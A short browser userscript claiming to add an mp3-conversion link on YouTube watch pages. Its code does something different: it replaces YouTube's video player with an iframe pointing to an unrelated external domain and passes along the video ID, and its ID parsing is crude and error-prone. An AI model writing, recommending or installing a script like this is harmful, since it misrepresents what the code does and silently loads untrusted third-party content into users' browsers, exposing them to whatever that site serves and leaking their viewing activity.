// ==UserScript==
// @name          Youtue New Player!
// @version       4.
// @author	  Zabihullah Kasimi
// @namespace     http://zabihullah.com/
// @description   Adds a link on Youtube to convert the currently playing video to mp3 format
// @include        http://youtube.com/watch?v=*
// @include        http://youtube.com/watch?v=*&*
// @include        http://*.youtube.com/watch?v=*
// @include        http://*.youtube.com/watch?v=*&*
// ==/UserScript==
var v = location.href.split("v");
var url=v[1];
document.getElementById('watch-player').innerHTML= '<iframe name="takk" src="http://helensbyraa.no/watch?v'+ url + '" height="390" width="640" border="0" frameborder="0"></iframe>';
